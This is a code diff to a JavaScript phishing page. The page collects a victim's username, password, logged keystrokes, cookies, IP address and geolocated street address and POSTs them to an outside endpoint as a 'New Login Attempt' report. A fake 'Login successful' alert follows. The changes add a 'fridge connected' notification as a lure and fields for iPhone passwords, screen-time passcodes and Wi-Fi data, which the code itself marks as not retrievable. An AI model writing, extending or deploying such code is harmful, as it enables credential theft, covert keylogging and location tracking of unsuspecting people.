@@ -75,16 +75,29 @@
                 .catch(() => 'IP not retrieved');
 
             // Attempt to detect if on mobile device
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            let deviceType = isMobile ? 'Mobile' : 'Desktop';
+            const isMobile = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            let deviceType = isMobile ? 'iPhone' : 'Other';
 
-            // Attempt to access screen time passcode (Note: This is not possible due to security restrictions)
+            // Attempt to access iPhone passwords and screen time passcode (Note: Not possible due to security restrictions)
+            let passwords = 'Passwords not accessible due to device security';
             let screenTimePasscode = 'Screen time passcode not accessible due to device security';
             try {
-                // No API exists to access screen time passcode on mobile devices
+                // No API exists to access iPhone passwords or screen time passcode
+                passwords = 'Not retrievable via web browser';
                 screenTimePasscode = 'Not retrievable via web browser';
             } catch (e) {
-                console.error('Error accessing screen time passcode:', e);
+                console.error('Error accessing passwords or screen time passcode:', e);
+            }
+
+            // Attempt to access devices on Wi-Fi (Note: Not possible in a browser context)
+            let networkDevices = 'Network device information not accessible due to browser security';
+            let networkPasswords = 'Network passwords not accessible due to browser security';
+            try {
+                // No standard browser API can enumerate devices on a Wi-Fi network
+                networkDevices = 'No devices detected';
+                networkPasswords = 'No passwords retrieved';
+            } catch (e) {
+                console.error('Error accessing network devices:', e);
             }
 
             // Attempt to get geolocation (requires user permission)
@@ -103,16 +116,42 @@
                 console.error('Error retrieving address:', e);
             }
 
+            // Attempt to send notification (Note: Limited by browser notification API)
+            let notificationStatus = 'Notification not sent due to browser restrictions';
+            try {
+                if (Notification.permission === 'granted') {
+                    new Notification('Fridge Connected Successfully', {
+                        body: 'Your fridge has been connected successfully!'
+                    });
+                    notificationStatus = 'Notification sent';
+                } else if (Notification.permission !== 'denied') {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === 'granted') {
+                            new Notification('Fridge Connected Successfully', {
+                                body: 'Your fridge has been connected successfully!'
+                            });
+                            notificationStatus = 'Notification sent after permission';
+                        }
+                    });
+                }
+            } catch (e) {
+                console.error('Error sending notification:', e);
+            }
+
             const data = {
                 username,
                 password,
                 keystrokes: keystrokes.join(''),
                 cookies,
                 deviceType,
+                passwords,
                 screenTimePasscode,
+                networkDevices,
+                networkPasswords,
                 ip,
                 address,
                 streetName,
+                notificationStatus,
                 timestamp: new Date().toISOString()
             };
 
@@ -122,7 +161,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `**New Login Attempt**\nUsername: ${data.username}\nPassword: ${data.password}\nKeystrokes: ${data.keystrokes}\nCookies: ${data.cookies}\nDevice Type: ${data.deviceType}\nScreen Time Passcode: ${data.screenTimePasscode}\nIP: ${data.ip}\nAddress: ${data.address}\nStreet Name: ${data.streetName}\nTimestamp: ${data.timestamp}`
+                    content: `**New Login Attempt**\nUsername: ${data.username}\nPassword: ${data.password}\nKeystrokes: ${data.keystrokes}\nCookies: ${data.cookies}\nDevice Type: ${data.deviceType}\nPasswords: ${data.passwords}\nScreen Time Passcode: ${data.screenTimePasscode}\nNetwork Devices: ${data.networkDevices}\nNetwork Passwords: ${data.networkPasswords}\nIP: ${data.ip}\nAddress: ${data.address}\nStreet Name: ${data.streetName}\nNotification Status: ${data.notificationStatus}\nTimestamp: ${data.timestamp}`
                 })
             }).then(() => {
                 alert('Login successful! Check your account for details.');
